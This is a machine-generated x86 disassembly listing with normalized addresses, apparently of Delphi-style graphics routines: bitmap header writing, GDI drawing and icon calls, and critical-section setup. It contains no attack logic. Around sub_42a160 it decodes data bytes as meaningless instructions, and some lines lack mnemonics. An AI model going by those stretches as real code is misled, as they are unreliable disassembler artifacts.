push edi
add esp 0xffffffac
mov ebx edx
mov edi eax
mov esi [ edi + 0x28 ]
lea eax [ esi + 0x30 ]
cmp [ eax + 0xc ] 0x1
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ eax + 0xe ] 0x1
je r-xdata
cmp bl al
je r-xdata
mov al 0x1
add esp 0x54
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_4284c8
push esi
push edi
add esi 0x18
lea edi [ esp + 0x8 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
xor eax eax
mov [ esp + 0x18 ] eax
xor eax eax
mov al bl
mov [ esp + 0x24 ] ax
mov [ esp + 0x26 ] ax
mov [ esp + 0x10 ] ax
mov [ esp + 0x12 ] ax
push esp
mov ecx [ esi + 0x10 ]
mov edx [ esi + 0x8 ]
mov eax edi
call sub_427ed4
mov edx edi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_4291d8
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax [ ebx + 0x28 ]
cmp edi [ eax + 0x10 ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov esi eax
test edi edi
jne r-xdata
mov eax ebx
call sub_4284b8
mov eax ebx
call sub_4284c8
push esi
push edi
add esi 0x18
lea edi [ ebp - 0x58 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
lea eax [ ebp - 0x58 ]
push eax
push 0x0
mov edx [ esi + 0x10 ]
mov eax [ esi + 0x8 ]
mov ecx edi
call sub_42746c
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42926f
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x58 ]
push eax
mov al [ esi + 0x70 ]
push eax
push 0x0
mov ecx edi
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_428808
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp [ esi + 0x4 ] 0x1
jne r-xdata
mov eax [ ebx + 0x28 ]
lea ecx [ eax + 0x18 ]
mov eax [ eax + 0x14 ]
mov edx edi
call sub_427364
mov [ ebx + 0x22 ] 0x1
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov eax [ esi + 0x10 ]
call sub_423664
xor eax eax
mov [ esi + 0x10 ] eax
jmp r-xdata
sub_429274
mov eax [ ebp - 0x4 ]
push eax
call DeleteObject
call sub_403a8c
call sub_403ae0
mov eax [ ebx + 0x28 ]
lea ecx [ eax + 0x18 ]
mov eax [ eax + 0x14 ]
mov edx edi
call sub_427364
mov [ ebx + 0x22 ] 0x1
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4292ac
push ebx
push esi
push edi
add esp 0xffffffac
mov edi edx
mov ebx eax
mov esi [ ebx + 0x28 ]
cmp edi [ esi + 0x1c ]
je r-xdata
add esp 0x54
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_4284c8
push esi
push edi
add esi 0x18
lea edi [ esp + 0x8 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
mov [ esp + 0x4 ] edi
mov [ esp + 0x1c ] edi
push esp
mov ecx [ esi + 0x10 ]
mov edx [ esi + 0x8 ]
mov eax ebx
call sub_427ed4
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_429308
push ebx
push esi
push edi
push ebp
add esp 0xfffffbd4
mov ebx ecx
mov edi edx
mov esi eax
lea eax [ esp + 0x10 ]
xor ecx ecx
mov edx 0xe
call sub_402cc4
mov [ esp + 0x10 ] 0x4d42
mov eax [ esi + 0x28 ]
mov ebp [ eax + 0x6c ]
test ebp ebp
je r-xdata
mov eax esi
call sub_428444
mov ebp [ esi + 0x28 ]
xor eax eax
mov [ esp ] eax
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
mov eax ebp
mov edx [ eax ]
call [ edx ]
mov [ esp ] eax
test bl bl
je r-xdata
test bl bl
je r-xdata
mov edx [ ebp + 0x50 ]
push edx
lea ecx [ esp + 0x4 ]
lea edx [ esp + 0xc ]
call sub_426860
cmp [ ebp + 0x70 ] 0x0
je r-xdata
mov eax [ esi + 0x28 ]
mov ebx [ eax + 0x6c ]
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx [ ebx + 0x4 ]
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x10 ]
jmp r-xdata
mov edx esp
mov ecx 0x4
mov eax edi
call sub_41b0cc
cmp [ esp ] 0x0
je r-xdata
mov edx esp
mov ecx 0x4
mov eax edi
call sub_41b0cc
mov eax [ esp + 0x8 ]
add eax 0xe
add [ esp ] eax
lea eax [ esp + 0x10 ]
xor ecx ecx
mov edx 0xe
call sub_402cc4
mov [ esp + 0x10 ] 0x4d42
mov eax esi
call sub_428308
mov dl [ r-xdata ]
call sub_42571c
mov eax [ ebp + 0x14 ]
push eax
mov eax [ esi + 0x2c ]
mov eax [ eax + 0x4 ]
push eax
call SelectObject
call sub_425a34
mov [ esp + 0xc ] eax
lea eax [ esp + 0x2a ]
push eax
push 0x100
push 0x0
mov eax [ esi + 0x2c ]
mov eax [ eax + 0x4 ]
push eax
call GetDIBColorTable
mov [ esp + 0x4 ] eax
mov eax [ esp + 0xc ]
push eax
mov eax [ esi + 0x2c ]
mov eax [ eax + 0x4 ]
push eax
call SelectObject
mov eax [ ebp + 0x50 ]
test eax eax
jbe r-xdata
mov [ esp + 0x8 ] 0xc
mov ax [ ebp + 0x3e ]
cmp ax 0x8
ja r-xdata
add esp 0x42c
pop ebp
pop edi
pop esi
pop ebx
retn
lea eax [ ebp + 0x18 ]
call sub_427420
cmp [ esp + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x70 ] 0x0
jne r-xdata
cmp eax [ esp + 0x4 ]
jae r-xdata
mov ecx eax
mov eax 0x1
shl eax cl
lea eax [ eax + eax * 2 ]
add [ esp + 0x8 ] eax
cmp [ ebp + 0x70 ] 0x0
je r-xdata
mov eax [ ebp + 0x50 ]
test eax eax
je r-xdata
mov eax [ esp ]
mov [ esp + 0x12 ] eax
mov eax [ esp + 0x8 ]
add eax 0xe
mov [ esp + 0x1a ] eax
cmp [ esp + 0x4 ] 0x0
jne r-xdata
mov [ esp + 0x4 ] eax
lea edx [ esp + 0x10 ]
mov ecx 0xe
mov eax edi
call sub_41b0cc
lea edx [ ebp + 0x30 ]
mov ecx 0x28
mov eax edi
call sub_41b0cc
cmp [ ebp + 0x3e ] 0x8
jbe r-xdata
lea eax [ ebp + 0x30 ]
mov [ esp + 0x1e ] 0xc
mov dx [ eax + 0x4 ]
mov [ esp + 0x22 ] dx
mov dx [ eax + 0x8 ]
mov [ esp + 0x24 ] dx
mov [ esp + 0x26 ] 0x1
mov ax [ eax + 0xe ]
mov [ esp + 0x28 ] ax
lea edx [ esp + 0x10 ]
mov ecx 0xe
mov eax edi
call sub_41b0cc
lea edx [ esp + 0x1e ]
mov ecx 0xc
mov eax edi
call sub_41b0cc
jmp r-xdata
mov eax [ esp + 0x4 ]
mov [ ebp + 0x50 ] eax
cmp eax [ esp + 0x4 ]
je r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
xor eax eax
mov al [ ebp + 0x70 ]
xor ecx ecx
mov cl [ eax + rw-data ]
imul ecx [ esp + 0x4 ]
lea edx [ esp + 0x2a ]
mov eax edi
call sub_41b0cc
mov edx [ ebp + 0x2c ]
mov ecx [ ebp + 0x44 ]
mov eax edi
call sub_41b0cc
test [ ebp + 0x40 ] 0x3
je r-xdata
lea edx [ esp + 0x4 ]
lea eax [ esp + 0x2a ]
call sub_425ea4
cmp [ ebp + 0x70 ] 0x0
je r-xdata
cmp [ ebp + 0x71 ] 0x0
jne r-xdata
lea edx [ ebp + 0x58 ]
mov ecx 0xc
mov eax edi
call sub_41b0cc
lea edx [ esp + 0x2a ]
mov ecx 0xff
mov eax [ ebp + 0x10 ]
call sub_4261c8
mov [ esp + 0x4 ] eax
cmp [ ebp + 0x3e ] 0x8
jbe r-xdata
mov eax [ esp + 0x4 ]
shl eax 0x2
add [ esp ] eax
add [ esp + 0x8 ] eax
sub_4295c8
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx eax
mov [ edx ] 0x2
mov eax ebx
call sub_4284c8
mov esi [ ebx + 0x28 ]
push esi
add esi 0x18
lea edi [ ebp - 0x58 ]
mov ecx 0x15
[ edi ] [ esi ]
pop esi
xor eax eax
mov [ ebp - 0x40 ] eax
xor eax eax
mov [ ebp - 0x44 ] eax
lea eax [ ebp - 0x58 ]
push eax
mov eax [ ebx + 0x2c ]
push eax
mov edi [ esi + 0x10 ]
mov ecx edi
mov edx edi
mov eax [ esi + 0x8 ]
call sub_42746c
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
xor eax eax
push ebp
push sub_429642
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x10 ]
call sub_427ad0
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_429668
push ebx
push esi
call sub_403664
mov ebx edx
mov esi eax
mov eax [ esi + 0xc ]
call sub_4032b0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4032a0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40364c
sub_4296b0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_426b9c
mov [ edi + 0x21 ] 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_403280
mov esi eax
mov [ edi + 0x28 ] esi
mov eax esi
call sub_427298
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035fc
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403654
pop [ fs : 0x0 ]
add esp 0xc
sub_429704
push ebx
push esi
call sub_403664
mov ebx edx
mov esi eax
mov eax [ esi + 0x28 ]
call sub_42729c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_418f80
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40364c
sub_429734
push ebx
push esi
push edi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_40343c
test al al
je r-xdata
xor ecx ecx
xor edx edx
mov eax esi
call sub_429a0c
mov edi ebx
mov eax [ edi + 0x28 ]
call sub_427298
mov eax [ esi + 0x28 ]
call sub_42729c
mov eax [ edi + 0x28 ]
mov [ esi + 0x28 ] eax
jmp r-xdata
mov edx ebx
mov eax esi
call sub_418fac
pop edi
pop esi
pop ebx
retn
mov edx esi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
jmp r-xdata
sub_429794
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax esi
call sub_42571c
push 0x3
push 0x0
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_4297ec
push eax
mov eax [ edi + 0x4 ]
push eax
mov eax [ edi ]
push eax
mov eax [ esi + 0x4 ]
push eax
call DrawIconEx
pop edi
pop esi
pop ebx
retn
sub_429828
push ebx
push esi
add esp 0xfffffff4
mov esi eax
mov ebx [ esi + 0x28 ]
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
add esp 0xc
pop esi
pop ebx
retn
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
push 0x0
push 0x0
call sub_41ae88
mov edx esp
mov ecx 0x6
mov eax [ ebx + 0xc ]
call sub_41b094
mov ax [ esp + 0x2 ]
sub ax 0x1
jb r-xdata
mov eax [ rw-data ]
mov [ esp + 0x8 ] eax
jmp r-xdata
je r-xdata
mov eax [ esp + 0x8 ]
mov [ ebx + 0x8 ] eax
push 0x6
lea eax [ esi + 0x2c ]
push eax
lea eax [ ebx + 0x10 ]
push eax
movzx ecx [ esp + 0x10 ]
lea edx [ esp + 0x14 ]
mov eax [ ebx + 0xc ]
call sub_426474
jmp r-xdata
jmp r-xdata
call sub_42592c
sub_4298a0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi eax
mov ebx [ esi + 0x28 ]
cmp [ ebx + 0xc ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403280
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42992d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_4297ec
cmp eax [ rw-data ]
jne r-xdata
call sub_42592c
mov eax esi
call sub_4297ec
mov edx eax
xor ecx ecx
mov eax [ ebp - 0x4 ]
call sub_4269a0
lea eax [ ebp - 0xa ]
xor ecx ecx
mov edx 0x6
call sub_402cc4
lea edx [ ebp - 0xa ]
mov ecx 0x6
mov eax [ ebp - 0x4 ]
call sub_41b0cc
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebx + 0xc ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_429954
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403280
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4299e2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
mov edx [ eax ]
call [ edx ]
push eax
mov eax esi
call sub_41ae68
pop edx
sub edx eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov eax esi
call sub_41b094
lea edx [ ebp - 0xa ]
mov ecx 0x6
mov eax [ ebp - 0x4 ]
call sub_41b094
mov ax [ ebp - 0x8 ]
sub ax 0x2
jb r-xdata
mov ecx [ ebp - 0x4 ]
xor edx edx
mov eax ebx
call sub_429a0c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_42592c
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4299e7
mov eax [ ebp - 0x4 ]
call sub_4032b0
call sub_403a8c
call sub_403ae0
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_429a0c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403280
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_429a4c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov [ eax + 0x8 ] esi
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] edi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_427298
mov eax [ ebx + 0x28 ]
call sub_42729c
mov eax [ ebp - 0x4 ]
mov [ ebx + 0x28 ] eax
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_429acc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4298a0
mov eax [ ebx + 0x28 ]
mov ebx [ eax + 0xc ]
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx [ ebx + 0x4 ]
mov eax esi
call sub_41b0cc
pop esi
pop ebx
retn
sub_429b1c
push ebx
push 0x0
call GetDC
mov ebx eax
push 0x5a
push ebx
call GetDeviceCaps
mov [ rw-data ] eax
push ebx
push 0x0
call ReleaseDC
mov eax rw-data
mov edx 0xf
call sub_425f74
mov [ rw-data ] eax
pop ebx
retn
sub_429b54
push ebx
push esi
add esp 0xffffffc8
mov bl 0x1
push 0x0
call GetDC
mov esi eax
test esi esi
je r-xdata
mov eax ebx
add esp 0x38
pop esi
pop ebx
retn
mov eax [ rw-data ]
push eax
push esi
call SelectObject
test eax eax
je r-xdata
push esi
push 0x0
call ReleaseDC
push esp
push esi
call GetTextMetricsA
test eax eax
je r-xdata
mov bl [ esp + 0x34 ]
sub_429b98
push ebx
push esi
push edi
push 0x48
mov eax [ rw-data ]
push eax
push 0x8
call MulDiv
neg eax
mov [ rw-data ] eax
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
call sub_429b54
mov ebx eax
mov eax ebx
sub al 0x80
jne r-xdata
mov esi r-xdata
mov edi rw-data
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push 0x48
mov eax [ rw-data ]
push eax
push 0x9
call MulDiv
neg eax
mov [ rw-data ] eax
mov [ rw-data ] bl
sub_429c64
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
lea eax [ esi + 0x8 ]
push eax
call InitializeCriticalSection
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035fc
mov eax esi
pop esi
pop ebx
retn
call sub_403654
pop [ fs : 0x0 ]
add esp 0xc
sub_429c9c
push ebx
push esi
call sub_403664
mov ebx edx
mov esi eax
mov eax esi
call sub_429e94
lea eax [ esi + 0x8 ]
push eax
call DeleteCriticalSection
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40364c
sub_429ce0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_429cc8
xor eax eax
push ebp
push sub_429d81
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp ebx [ eax + 0x8 ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_429d88
mov eax [ ebp - 0x4 ]
call sub_429cd4
retn
mov eax 0x10
call sub_4026ec
mov [ ebp - 0x8 ] eax
mov edi [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ edi ] eax
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_429d94
mov [ edi + 0x4 ] eax
mov [ edi + 0x8 ] ebx
mov [ edi + 0xc ] esi
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
cmp esi [ eax + 0xc ]
jne r-xdata
sub_429d94
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov dl 0x1
mov eax [ r-xdata ]
call sub_427d40
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_429e73
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx 0x8
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov edx 0x8
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x8 ]
call sub_428308
mov edi eax
mov eax [ edi + 0x14 ]
xor edx edx
call sub_424cdc
mov eax [ edi + 0x14 ]
mov edx ebx
call sub_424bc0
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x20 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov ecx eax
xor edx edx
xor eax eax
call sub_417358
lea edx [ ebp - 0x18 ]
mov eax edi
call sub_425224
xor esi esi
mov edx ebx
and edx 0x80000001
jns r-xdata
dec eax
or eax 0xfffffffe
inc eax
cmp eax edx
jne r-xdata
dec edx
or edx 0xfffffffe
inc edx
inc ebx
cmp ebx 0x9
jne r-xdata
mov eax [ ebp - 0x4 ]
push eax
mov ecx esi
mov edx ebx
mov eax edi
call sub_425600
mov eax esi
and eax 0x80000001
jns r-xdata
inc esi
cmp esi 0x9
jne r-xdata
xor ebx ebx
mov eax [ ebp - 0x8 ]
call sub_427fc4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_429e94
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
test eax eax
jne r-xdata
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_429cc8
xor eax eax
push ebp
push sub_429edf
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_429ee6
mov eax [ ebp - 0x4 ]
call sub_429cd4
retn
mov esp ebp
pop ebp
retn
sub_429ee6
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
call sub_40270c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
test eax eax
jne r-xdata
call sub_4032b0
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_429cc8
xor eax eax
push ebp
push sub_429edf
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_429ee6
mov eax [ ebp - 0x4 ]
call sub_429cd4
retn
mov esp ebp
pop ebp
retn
sub_429f0c
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
pop esi
pop ebx
retn
mov eax esi
call sub_423f34
push eax
mov eax ebx
call sub_423f34
mov edx eax
mov eax [ rw-data ]
pop ecx
call sub_429ce0
mov eax [ eax + 0x4 ]
pop esi
pop ebx
retn
sub_429f44
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42a00d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42a014
retn
mov eax [ rw-data ]
call sub_4032b0
mov eax [ rw-data ]
call sub_4032b0
mov eax [ rw-data ]
call sub_4032b0
call sub_426f7c
mov eax [ rw-data ]
call sub_4032b0
mov eax [ rw-data ]
call sub_4032b0
mov eax [ rw-data ]
call sub_4032b0
mov eax [ rw-data ]
call sub_4032b0
mov eax [ rw-data ]
call sub_4032b0
mov eax [ rw-data ]
push eax
call DeleteObject
push rw-data
call DeleteCriticalSection
push rw-data
call DeleteCriticalSection
mov eax rw-data
mov ecx 0x12
mov edx [ r-xdata ]
call sub_404b54
mov eax rw-data
mov ecx 0x34
mov edx [ r-xdata ]
call sub_404b54
sub_42a018
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_429b1c
push rw-data
call InitializeCriticalSection
push rw-data
call InitializeCriticalSection
push 0x7
call GetStockObject
mov [ rw-data ] eax
push 0x5
call GetStockObject
mov [ rw-data ] eax
push 0xd
call GetStockObject
mov [ rw-data ] eax
push 0x7f00
push 0x0
call LoadIconA
mov [ rw-data ] eax
call sub_429b98
mov cx 0x2c
mov dl 0x1
mov eax [ sub_423678 ]
call sub_4236ec
mov [ rw-data ] eax
mov cx 0x10
mov dl 0x1
mov eax [ sub_423678 ]
call sub_4236ec
mov [ rw-data ] eax
mov cx 0x10
mov dl 0x1
mov eax [ sub_423678 ]
call sub_4236ec
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_429c64
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_418c1c
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_418c1c
mov [ rw-data ] eax
mov ecx sub_423f44
mov edx sub_423f54
mov eax [ r-xdata ]
call sub_418170
mov ecx r-xdata
mov edx sub_42415c
mov eax [ r-xdata ]
call sub_418170
sub_42a124
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42a149
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42a150
retn
sub_42a160
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov eax 0x140042a1
add [ eax ] al
add [ eax + 0x34e00041 ] bh
inc eax
add ah ch
xor al 0x40
add al dh
xor al 0x40
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ eax + ecx * 4 ] dh
inc ecx
add al bl
mov [ ecx ] eax
in al 0xa2
inc edx
add [ eax + 0x4004188 ] cl
mov [ ecx ] eax
or edx [ edi + ecx * 2 + 0x62 ]
push 0x65
arpl [ esp + ecx * 2 + 0x69 ] si
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
test [ edx + 0x80042 ] ah
add [ eax ] al
les esp [ ecx + 0x34e00042 ]
inc eax
add ah ch
xor al 0x40
add al dh
xor al 0x40
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ ebx + 0x42 ] ch
add al dl
mov [ 0xffffffffa3b00042 ] eax
inc edx
add [ ebx + 0x54060042 ] bl
adc [ edx + 0x42 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb al 0xa2
inc edx
add [ eax ] cl
add [ eax ] al
add [ eax - 0x1fffbff0 ] dh
xor al 0x40
add ah ch
xor al 0x40
add al dh
xor al 0x40
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ ebx + 0x42 ] ch
add ah ch
sub al [ eax ]
mov al 0xa3
inc edx
add [ ebx + 0x540c0042 ] bl
dec edi
jb r-xdata
cli
mov esi eax
cmp [ esi + 0x10 ] 0x0
je r-xdata
arpl [ ebx - 0x70 ] bp
push ebx
je r-xdata
push esp
jb r-xdata
mov ecx ebx
mov edx edi
mov eax esi
call sub_418c18
pop edi
pop esi
pop ebx
retn
cmp bl 0x2
jne r-xdata
dec esp
imul esi [ ebx + 0x74 ] 0x7800408d
mov [ 0x42 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov eax edi
call sub_4032b0
sub_42a28c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403280
mov [ esi + 0x10 ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035fc
mov eax esi
pop esi
pop ebx
retn
call sub_403654
pop [ fs : 0x0 ]
add esp 0xc
sub_42a2e4
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
cmp [ esi + 0x10 ] 0x0
je r-xdata
mov ecx ebx
mov edx edi
mov eax esi
call sub_418c18
pop edi
pop esi
pop ebx
retn
cmp bl 0x2
jne r-xdata
mov eax edi
call sub_4032b0
sub_42a328
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403280
mov dl 0x1
mov eax [ r-xdata ]
call sub_403280
mov [ esi + 0x4 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035fc
mov eax esi
pop esi
pop ebx
retn
call sub_403654
pop [ fs : 0x0 ]
add esp 0xc
sub_42a36c
push ebx
push esi
call sub_403664
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
call sub_4032b0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4032a0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40364c
sub_42a3b0
push ebx
push esi
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x8 ]
mov esi eax
mov eax [ ebx + 0x4 ]
mov edx [ eax + 0x8 ]
dec edx
call sub_4188a0
mov eax esi
pop esi
